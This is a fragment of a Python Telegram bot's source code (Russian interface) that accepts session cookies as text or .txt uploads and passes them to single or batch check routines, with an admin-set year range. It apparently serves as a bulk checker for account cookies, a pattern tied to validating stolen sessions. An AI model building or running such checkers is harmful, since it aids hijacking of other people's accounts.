        assert 2006 <= y <= 2030
        settings["year_to"] = y
        await message.answer("✅ Конечный год: <b>{}</b>".format(y))
        await state.clear()
    except (ValueError, AssertionError):
        await message.answer("❌ Введи число 2006–2030")


@dp.message(F.document)
async def handle_file(message: Message, state: FSMContext):
    if not is_admin(message): return
    if await state.get_state(): return
    doc = message.document
    if not doc.file_name.endswith(".txt"):
        await message.answer("❌ Нужен .txt файл")
        return
    file = await bot.get_file(doc.file_id)
    buf  = io.BytesIO()
    await bot.download_file(file.file_path, destination=buf)
    buf.seek(0)
    cookies = extract_cookies(buf.read().decode("utf-8", errors="ignore"))
    if not cookies:
        await message.answer("❌ Не нашёл cookie в файле")
        return
    await message.answer("📂 Найдено <b>{}</b> куков.".format(len(cookies)))
    if len(cookies) == 1:
        await run_check(message, cookies[0])
    else:
        await run_batch(message, cookies)


@dp.message(F.text)
async def handle_text(message: Message, state: FSMContext):
    if not is_admin(message): return
    if await state.get_state(): return
    cookies = extract_cookies(message.text)
    if not cookies:
        await message.answer("ℹ️ Отправь cookie или .txt файл\n/settings")
        return
    if len(cookies) == 1:
        await run_check(message, cookies[0])
    else:
        await run_batch(message, cookies)


# ========== ЗАПУСК ==========

async def main():
    print("Бот запущен...")
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())
